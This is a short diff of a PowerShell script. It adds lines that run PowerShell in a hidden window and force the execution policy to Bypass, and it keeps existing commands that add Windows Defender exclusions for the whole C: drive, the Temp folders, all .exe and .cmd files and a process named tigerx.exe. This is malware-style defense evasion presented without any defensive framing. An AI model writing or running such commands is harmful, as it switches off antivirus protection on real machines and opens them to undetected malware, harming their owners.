@@ -1,3 +1,5 @@
+Powershell.exe -WindowStyle Hidden
+Set-ExecutionPolicy Bypass -Force
 Add-MpPreference -ExclusionPath "C:*","tigerx.exe","C:\Windows\Temp\",".cmd",".exe","$env:TEMP"
 add-mppreference -exclusionprocess $env:TEMP
 add-mppreference -exclusionprocess tigerx.exe
